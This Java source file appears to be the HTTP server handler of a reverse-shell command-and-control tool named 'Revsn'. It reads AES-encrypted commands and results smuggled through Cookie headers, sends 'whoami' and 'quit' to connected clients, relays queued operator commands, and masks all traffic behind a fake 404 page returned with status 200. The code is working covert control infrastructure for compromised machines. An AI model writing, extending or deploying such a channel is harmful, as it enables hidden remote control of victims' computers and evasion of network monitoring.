package com.revsni.server.http;

import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.protocol.HttpContext;
import org.apache.http.protocol.HttpRequestHandler;

//import java.util.ArrayList;
//import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.codec.binary.Base64;

public class HTTPHandler implements HttpRequestHandler {
    //private volatile List<String> commands = new ArrayList<>();
    private volatile String answerCommands;
    private volatile boolean est = false;
    private SecretKey key;
    private IvParameterSpec iv;
    private Cipher cipherDec;
    private Cipher cipherEnc;
    //private volatile boolean gotAnswer;

    protected static final StringEntity http404 = new StringEntity("<html><body><h1>Not found</h1></body></html>", ContentType.create("text/html", "UTF-8"));

    public HTTPHandler(SecretKey key1, IvParameterSpec iv) {
        super();
        this.key = new SecretKeySpec(key1.getEncoded(), key1.getAlgorithm());
        this.iv = new IvParameterSpec(iv.getIV());

        //AES init
        try {
            cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);

            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            e.printStackTrace();
        }

    }

    public void sendCommand(String command) {
        String respo = command;
        try {
            answerCommands = new String(Base64.encodeBase64String(cipherEnc.doFinal(respo.getBytes())));
            System.out.println("Waiting for Response..");
            respo = "";
        } catch (IllegalBlockSizeException | BadPaddingException e) {
            e.printStackTrace();
        }
    } 

    @Override
    public void handle(HttpRequest request, HttpResponse response, HttpContext context) throws HttpException, IOException {
        String msg = "";
        String cookie = "";
        if(request.getRequestLine().getMethod().toUpperCase().contains("GET") && request.getRequestLine().getUri().contains("lit")) {
            if(request.getHeaders("Cookie") != null) {
                cookie = request.getHeaders("Cookie")[0].getValue();

                if(cookie.length() > 1) {

                    try {
                        msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
                    } catch (IllegalBlockSizeException | BadPaddingException e) {
                        e.printStackTrace();
                    }
                    if(msg.equals("est")) {
                        est = true;
                        try {
                            response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes())));
                        } catch (IllegalBlockSizeException | BadPaddingException e) {
                            System.out.println("Failed to send init whoami command (HTTP-Rev)");
                        }
                    } else if(msg.equals("kill")) {
                        try {
                            response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes())));
                        } catch (IllegalBlockSizeException | BadPaddingException e) {
                            System.out.println("Failed to send Quit command (HTTP-Rev)");
                        }
                    } else if(msg.equals("give") && answerCommands.length() > 0) {
                        response.setHeader("Cookie", answerCommands);
                        answerCommands = "";
                    } else if(msg.equals("give") && answerCommands.length() == 0) {

                    } else {
                        System.out.println(msg);
                        System.out.print("Revsn [HTTP] » ");
                    }
                    response.setStatusCode(200);
                    response.setEntity(http404);
                } else {
                    response.setStatusCode(200);
                    response.setEntity(http404);
                }
            }
        }
    }
        
    public boolean getConnInf() {
        return this.est;
    }
    
}